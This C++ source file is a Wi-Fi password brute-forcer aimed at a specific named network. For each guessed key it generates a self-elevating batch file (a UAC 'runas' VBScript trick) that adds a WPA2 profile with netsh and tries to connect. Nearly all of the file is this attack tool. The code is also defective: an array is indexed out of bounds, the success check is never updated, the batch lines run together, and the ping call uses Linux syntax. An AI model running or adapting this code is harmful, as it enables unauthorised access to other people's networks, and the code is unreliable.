#include <iostream>
#include <ctime>
#include <filesystem>
#include <fstream>
#include <cstdlib>
#include <Windows.h>

using namespace std;

namespace fs = std::filesystem;

string crackPassword(const string& pass);
bool internetConnCheck();
long long int attempt;
clock_t start_t = clock();
clock_t end_t;

//DICTIONARIES:
const string dictDigits = "-0123456789";
const string dictSmallCase = "-abcdefghijklmnopqrstuvwxyz";
const string dictUppCase = "-ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const string dictDigNSmall = "-0123456789abcdefghijklmnopqrstuvwxyz";
const string dictDigNUpp = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const string dictSmallNUpp = "-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
const string dictFull = "-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

string test;
string alphabet;
string password;

bool isconnect;

int digit[7];
int alphabetSet = 1;
int passwordLength = 1;

int main() {
    while (!isconnect) {
        internetConnCheck();
    }
    /*
    cout << "Enter the password to crack : ";
    cin >> password;
    */
    cout <<  crackPassword(password) << "\n\n>\n>> CRACKED THE PASSWORD! >>\n>\n The password : " << password << "\n";
    cout << "The number of attempts : " << attempt << "\n";
    cout << "The time duration  passed : " << (double)(end_t - start_t)/1000 << " seconds\n\n";
    return 0;
}

bool internetConnCheck() {
    if (system("ping -c1 -s1 www.google.com")) {
        isconnect = false;
        return isconnect;
    }
    else {
        isconnect = true;
        return isconnect;
    }
}

void batCreator() {

    // Create an executable batch file (Windows)
    #ifdef _WIN32
    const char* batch_file_name = "a.bat";
    {
        std::ofstream batch_file( batch_file_name );
        batch_file <<
        //RUN AS ADMIN:
            "set \"params=%*\""
            "cd /d \"%~dp0\" && ( if exist \"%temp%\\getadmin.vbs\" del \"%temp%\\getadmin.vbs\" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^(\"Shell.Application\"^) : UAC.ShellExecute \"cmd.exe\", \"/k cd \"\"%~sdp0\"\" && \"\"%~s0\"\" %params%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\" && \"%temp%\\getadmin.vbs\" && exit /B )"
        //CORE BATCH FILE:
            "@echo off\n"

            "set \"SSID=UPC8327877\""
            "set \"HEXSTR=" << test << "\""
            "set \"XML_OUTPUT_PATH=%TEMP%\\%SSID%-wireless-profile-generated.xml\""

            "echo ^<?xml version=\"1.0\"?^>^<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"^>^<name^>%SSID%^</name^>^<SSIDConfig^>^<SSID^>^<name^>%SSID%^</name^>^</SSID^>^</SSIDConfig^>^<connectionType^>ESS^</connectionType^>^<connectionMode^>auto^</connectionMode^>^<MSM^>^<security^>^<authEncryption^>^<authentication^>WPA2PSK^</authentication^>^<encryption^>AES^</encryption^>^<useOneX^>false^</useOneX^>^</authEncryption^>^<sharedKey^>^<keyType^>passPhrase^</keyType^>^<protected^>false^</protected^>^<keyMaterial^>%HEXSTR%^</keyMaterial^>^</sharedKey^>^</security^>^</MSM^>^<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\"^>^<enableRandomization^>false^</enableRandomization^>^</MacRandomization^>^</WLANProfile^> >%XML_OUTPUT_PATH%"

            "netsh wlan add profile filename=\"%XML_OUTPUT_PATH%\""
            "netsh wlan connect name=\"%SSID%\""

            "del \"%XML_OUTPUT_PATH%\""
            "echo."
            "pause";
    }

    fs::permissions( batch_file_name, fs::perms::owner_exec, fs::perm_options::add );
    #endif
    // Execute the file
    std::cout << "main() before batch call\n";
    std::system(batch_file_name );
    std::cout << "main() after batch call\n";

    // Delete the file
    remove( batch_file_name );

}

void textDisplayFun(int alphabetSet) {
        switch (alphabetSet) {
            case 1 : alphabet = dictDigits;
            cout << "\n\n (Tested password length: " << passwordLength << " )Testing only DIGITS, please wait";  break;
            case 2 : alphabet = dictSmallCase;
            cout << "\n\n Couldn't find the password. \n\n Testing LOWERCASE, please wait";  break;
            case 3 : alphabet = dictUppCase;
            cout << "\n\n Couldn't find the password. \n\n Testing UPPERCASE, please wait";  break;
            case 4 : alphabet = dictDigNSmall;
            cout << "\n\n Couldn't find the password. \n\n Testing DIGITS, LOWERCASE, please wait";  break;
            case 5 : alphabet = dictDigNUpp;
            cout << "\n\n Couldn't find the password. \n\n Testing DIGITS, UPPERCASE, please wait";  break;
            case 6 : alphabet = dictSmallNUpp;
            cout << "\n\n Couldn't find the password. \n\n Testing LOWERCASE, UPPERCASE, please wait";  break;
            case 7 : alphabet = dictFull;
            cout << "\n\n Couldn't find the password. \n\n Testing DIGITS, LOWERCASE, UPPERCASE, please wait";
            break;
        }
}

string crackPassword(const string& pass) {
    while (true) {
            switch (passwordLength) {
                case 1:
                    while (alphabetSet < 4) {
                        switch (alphabetSet) {
                            case 1 : alphabet = dictDigits;
                                     cout << "\n\n (Tested password length: " << passwordLength << " )Testing: DIGITS, please wait";  break;
                            case 2 : alphabet = dictSmallCase;
                                     cout << "\n\n Couldn't find the password. \n\n Testing LOWERCASE, please wait";  break;
                            case 3 : alphabet = dictUppCase;
                                     cout << "\n\n Couldn't find the password. \n\n Testing UPPERCASE, please wait";  break;
                            }
                        for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                            attempt++;
                            if (attempt % 2500000 == 0)
                                cout << ".";
                            test = alphabet[digit[0]];
                            for (int i=1; i < passwordLength; i++)
                                if (alphabet[digit[i]] != '-')
                                    test += alphabet[digit[i]];
                            batCreator();
                            if(isconnect) {
                                end_t = clock();
                                return test;
                            }
                        }
                        alphabetSet++;
                    }
                    break;
                case 2:
                    alphabetSet = 1;
                    while (alphabetSet < 6) {
                        switch (alphabetSet) {
                            case 1 : alphabet = dictDigits;
                                     cout << "\n\n (Tested password length: " << passwordLength << " )Testing: DIGITS, please wait";  break;
                            case 2 : alphabet = dictSmallCase;
                                     cout << "\n\n Couldn't find the password. \n\n Testing LOWERCASE, please wait";  break;
                            case 3 : alphabet = dictUppCase;
                                     cout << "\n\n Couldn't find the password. \n\n Testing UPPERCASE, please wait";  break;
                            case 4 : alphabet = dictDigNSmall;
                                     cout << "\n\n Couldn't find the password. \n\n Testing DIGITS, LOWERCASE, please wait";  break;
                            case 5 : alphabet = dictDigNUpp;
                                     cout << "\n\n Couldn't find the password. \n\n Testing DIGITS, UPPERCASE, please wait";  break;
                        }
                        for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                            for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                attempt++;
                                if (attempt % 2500000 == 0)
                                    cout << ".";
                                    test = alphabet[digit[0]];
                                for (int i = 1; i < passwordLength; i++)
                                    if (alphabet[digit[i]] != '-')
                                        test += alphabet[digit[i]];
                                batCreator();
                                if (isconnect) {
                                    end_t = clock();
                                    return test;
                                }
                            }
                        alphabetSet++;
                    }
                    break;
                case 3:
                    alphabetSet = 1;
                    while (alphabetSet < 8) {
                        textDisplayFun(alphabetSet);
                        alphabetSet++;
                        for (digit[2] = 0; digit[2] < alphabet.length(); digit[2]++)
                            for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                                for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                    attempt++;
                                    if (attempt % 2500000 == 0)
                                        cout << ".";
                                    test = alphabet[digit[0]];
                                    for (int i = 1; i < passwordLength; i++)
                                        if (alphabet[digit[i]] != '-')
                                            test += alphabet[digit[i]];
                                    batCreator();
                                    if (isconnect) {
                                        end_t = clock();
                                        return test;
                                    }
                                }
                    }
                    break;
                case 4:
                    alphabetSet = 1;
                    while (alphabetSet < 8){
                        textDisplayFun(alphabetSet);
                        for (digit[3] = 0; digit[3] < alphabet.length(); digit[3]++)
                            for (digit[2] = 0; digit[2] < alphabet.length(); digit[2]++)
                                for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                                    for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                        attempt++;
                                        if (attempt % 2500000 == 0) cout << ".";
                                        test = alphabet[digit[0]];
                                        for (int i = 1; i < passwordLength; i++)
                                            if (alphabet[digit[i]] != '-')
                                                test += alphabet[digit[i]];
                                        batCreator();
                                        if (isconnect) {
                                            end_t = clock();
                                            return test;
                                        }
                                    }
                        alphabetSet++;
                    }
                    break;
                case 5:
                    alphabetSet = 1;
                    while (alphabetSet < 8) {
                        textDisplayFun(alphabetSet);
                        for (digit[4] = 0; digit[4] < alphabet.length(); digit[4]++)
                            for (digit[3] = 0; digit[3] < alphabet.length(); digit[3]++)
                                for (digit[2] = 0; digit[2] < alphabet.length(); digit[2]++)
                                    for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                                        for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                            attempt++;
                                            if (attempt % 2500000 == 0)
                                                cout << ".";
                                            test = alphabet[digit[0]];
                                            for (int i = 1; i < passwordLength; i++)
                                                if(alphabet[digit[i]] != '-')
                                                    test += alphabet[digit[i]];
                                            batCreator();
                                            if (isconnect) {
                                                end_t = clock();
                                                return test;
                                            }
                                        }
                        alphabetSet++;
                    }
                    break;
                case 6:
                    alphabetSet = 1;
                    while (alphabetSet < 8) {
                        textDisplayFun(alphabetSet);
                            for (digit[5] = 0; digit[5] < alphabet.length(); digit[5]++)
                                for (digit[4] = 0; digit[4] < alphabet.length(); digit[4]++)
                                    for (digit[3] = 0; digit[3] < alphabet.length(); digit[3]++)
                                        for (digit[2] = 0; digit[2] < alphabet.length(); digit[2]++)
                                            for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                                                for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                                    attempt++;
                                                    if (attempt % 2500000 == 0)
                                                        cout << ".";
                                                    test = alphabet[digit[0]];
                                                    for (int i = 1; i < passwordLength; i++)
                                                        if (alphabet[digit[i]] != '-')
                                                            test += alphabet[digit[i]];
                                                    batCreator();
                                                    if (isconnect) {
                                                        end_t = clock();
                                                        return test;
                                                    }
                                                }
                        alphabetSet++;
                    }
                    break;
                case 7:
                    alphabetSet = 1;
                    while (alphabetSet < 8) {
                        textDisplayFun(alphabetSet);
                        for (digit[6] = 0; digit[6] < alphabet.length(); digit[6]++)
                            for (digit[5] = 0; digit[5] < alphabet.length(); digit[5]++)
                                for (digit[4] = 0; digit[4] < alphabet.length(); digit[4]++)
                                    for (digit[3] = 0; digit[3] < alphabet.length(); digit[3]++)
                                        for (digit[2] = 0; digit[2] < alphabet.length(); digit[2]++)
                                            for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                                                for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                                    attempt++;
                                                    if (attempt % 2500000 == 0)
                                                        cout << ".";
                                                    test = alphabet[digit[0]];
                                                    for (int i = 1; i < passwordLength; i++)
                                                        if (alphabet[digit[i]] != '-')
                                                            test += alphabet[digit[i]];
                                                    batCreator();
                                                    if (isconnect) {
                                                        end_t = clock();
                                                        return test;
                                                    }
                                                }
                        alphabetSet++;
                    }
                    break;
                case 8:
                    alphabetSet = 1;
                    while (alphabetSet < 8) {
                        textDisplayFun(alphabetSet);
                        for (digit[7] = 0; digit[7] < alphabet.length(); digit[7]++)
                            for (digit[6] = 0; digit[6] < alphabet.length(); digit[6]++)
                                for (digit[5] = 0; digit[5] < alphabet.length(); digit[5]++)
                                    for (digit[4] = 0; digit[4] < alphabet.length(); digit[4]++)
                                        for (digit[3] = 0; digit[3] < alphabet.length(); digit[3]++)
                                            for (digit[2] = 0; digit[2] < alphabet.length(); digit[2]++)
                                                for (digit[1] = 0; digit[1] < alphabet.length(); digit[1]++)
                                                    for (digit[0] = 1; digit[0] < alphabet.length(); digit[0]++) {
                                                        attempt++;
                                                        if (attempt % 2500000 == 0)
                                                            cout << ".";
                                                        test = alphabet[digit[0]];
                                                        for (int i = 1; i < passwordLength; i++)
                                                            if (alphabet[digit[i]] != '-')
                                                                test += alphabet[digit[i]];
                                                        batCreator();
                                                        if (isconnect) {
                                                            end_t = clock();
                                                            return test;
                                                        }
                                                    }
                        alphabetSet++;
                    }
                    break;
            }
        cout  << "\n\n * \n ";
        cout  << "*** Password length is not " << passwordLength <<  ". Increasing password length! ***";
        cout  << "\n * \n\n";
        passwordLength++;
    }
}